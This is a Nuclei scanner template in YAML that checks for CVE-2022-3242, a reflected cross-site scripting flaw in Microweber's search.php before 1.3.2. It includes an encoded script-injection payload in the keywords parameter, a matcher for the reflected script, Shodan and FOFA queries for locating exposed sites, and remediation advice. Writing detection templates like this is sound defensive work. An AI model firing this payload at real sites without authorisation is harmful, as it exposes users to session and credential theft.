http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/html")
    - contains(body, "<script>alert(document.domain)</script>") && contains(tolower(body),
      "microweber")
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/search.php?keywords=ABC%3Cdiv%20style=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
id: CVE-2022-3242
info:
  author: r3Y3r53
  classification:
    cpe: cpe:2.3:a:microweber:microweber:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-3242
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79,CWE-94
    epss-percentile: 0.94454
    epss-score: 0.15577
  description: 'Code Injection in on search.php?keywords= GitHub repository microweber/microweber
    prior to 1.3.2.

    '
  impact: 'Attackers can craft malicious search URLs with JavaScript in the keywords
    parameter that executes when users access search results, potentially stealing
    session cookies, admin credentials, or performing unauthorized content modifications
    in Microweber CMS.

    '
  metadata:
    fofa-query:
    - body="microweber"
    - icon_hash=780351152
    max-request: 1
    product: microweber
    shodan-query:
    - http.favicon.hash:780351152
    - http.html:"microweber"
    vendor: microweber
    verified: true
  name: Microweber <1.3.2 - Cross-Site Scripting
  reference:
  - https://huntr.dev/bounties/3e6b218a-a5a6-40d9-9f7e-5ab0c6214faf/
  - https://www.tenable.com/cve/CVE-2022-3242
  - https://nvd.nist.gov/vuln/detail/CVE-2022-3242
  - https://github.com/microweber/microweber/commit/68f0721571653db865a5fa01c7986642c82e919c
  remediation: 'Update Microweber to version 1.3.2 or later that properly sanitizes
    and encodes the keywords parameter in search.php.

    '
  severity: medium
  tags: cve,cve2022,huntr,xss,microweber,vuln
